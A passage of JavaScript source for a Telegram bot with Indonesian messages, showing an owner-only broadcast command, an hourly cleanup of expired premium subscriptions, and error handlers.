  bot.sendMessage(chatId, `✅ Premium ditambahkan untuk ID: ${targetId}\nDurasi: ${days} hari`);
});

bot.onText(/\/bc (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) return;

  const text = match[1];
  const data = await getAllUsers(true);
  const users = Object.keys(data.users || {});

  let success = 0;
  for (let id of users) {
    try {
      await bot.sendMessage(id, text, { parse_mode: "HTML" });
      success++;
      await sleep(100);
    } catch (err) {
      console.log(`Gagal kirim ke ${id}`);
    }
  }

  bot.sendMessage(chatId, `✅ Broadcast selesai!\nBerhasil: ${success}\nGagal: ${users.length - success}`);
});

// ==================== AUTO CLEANUP EXPIRED PREMIUM ====================
setInterval(async () => {
  const data = await getAllUsers(true);
  let changed = false;
  
  for (let id in data.users) {
    const user = data.users[id];
    if (user.premium && user.premiumExpired && Date.now() > user.premiumExpired) {
      user.premium = false;
      user.maxLinks = 3;
      changed = true;
    }
  }
  
  if (changed) {
    await saveAllUsers(data);
    console.log("✅ Premium expired cleaned.");
  }
}, 3600000);

// ==================== ERROR HANDLING ====================
bot.on('polling_error', (error) => {
  console.error('[BOT] Error:', error);
});

process.on("unhandledRejection", (err) => {
  console.error("Unhandled Rejection:", err.message);
});

process.on("uncaughtException", (err) => {
  console.error("Uncaught Exception:", err.message);
});

console.log(chalk.green('[BOT] Bot Aktif!'));